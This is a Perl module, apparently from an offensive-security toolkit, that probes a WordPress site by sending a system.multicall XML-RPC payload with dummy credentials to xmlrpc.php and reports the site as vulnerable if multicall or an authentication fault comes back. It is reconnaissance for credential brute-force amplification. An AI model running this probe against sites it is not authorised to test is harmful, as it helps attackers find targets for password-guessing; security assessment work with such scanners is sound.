package Spellbook::Exploit::Wordpress_XMLRPC {
    use strict;
    use warnings;
    use Mojo::UserAgent;
    use Mojo::URL;

    our $VERSION = '0.0.1';

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'     => \$help,
            't|target=s' => \$target
        );

        if ($target) {
            if ($target !~ m/^http(s)?:\/\//msx) {
                $target = "http://$target";
            }

            my $useragent = Mojo::UserAgent -> new();
            my $xmlrpc_url = Mojo::URL -> new($target);
            my $path_value = $xmlrpc_url -> path() -> to_string;

            if ($path_value eq "") {
                $path_value = "/";
            }

            if ($path_value !~ /xmlrpc\.php$/msx) {
                if ($path_value !~ m{/$}x) {
                    $path_value .= "/";
                }

                $path_value .= "xmlrpc.php";
                $xmlrpc_url -> path($path_value);
            }

            my $payload = "<?xml version=\"1.0\"?>\n"
                . "<methodCall>\n"
                . "<methodName>system.multicall</methodName>\n"
                . "<params>\n"
                . "<param>\n"
                . "<value>\n"
                . "<array>\n"
                . "<data>\n"
                . "<value>\n"
                . "<struct>\n"
                . "<member>\n"
                . "<name>methodName</name>\n"
                . "<value><string>wp.getUsersBlogs</string></value>\n"
                . "</member>\n"
                . "<member>\n"
                . "<name>params</name>\n"
                . "<value>\n"
                . "<array>\n"
                . "<data>\n"
                . "<value>\n"
                . "<array>\n"
                . "<data>\n"
                . "<value><string>invalid_user</string></value>\n"
                . "<value><string>invalid_pass</string></value>\n"
                . "</data>\n"
                . "</array>\n"
                . "</value>\n"
                . "</data>\n"
                . "</array>\n"
                . "</value>\n"
                . "</member>\n"
                . "</struct>\n"
                . "</value>\n"
                . "</data>\n"
                . "</array>\n"
                . "</value>\n"
                . "</param>\n"
                . "</params>\n"
                . "</methodCall>\n";

            my $response = $useragent -> post(
                $xmlrpc_url,
                { 'Content-Type' => 'text/xml' },
                $payload
            ) -> result();

            if ($response -> is_success()) {
                my $content = $response -> body();
                my $has_fault = $content =~ /<name>faultString<\/name>/msx;
                my $has_auth_error = $content =~ /Incorrect username or password|is not registered on this site|authentication failed/msxi;
                my $has_multicall = $content =~ /system\.multicall/msx;
                my $is_vulnerable = 0;

                if ($has_multicall) {
                    $is_vulnerable = 1;
                }

                if ($has_fault && $has_auth_error) {
                    $is_vulnerable = 1;
                }

                if ($is_vulnerable) {
                    push @result, $xmlrpc_url;
                }
            }

            return @result;
        }

        if ($help) {
            return "
                \rExploit::Wordpress_XMLRPC
                \r=========================
                \r-h, --help     See this menu
                \r-t, --target   Set a target to probe WordPress XML-RPC\n\n";
        }

        return 0;
    }
}

1;
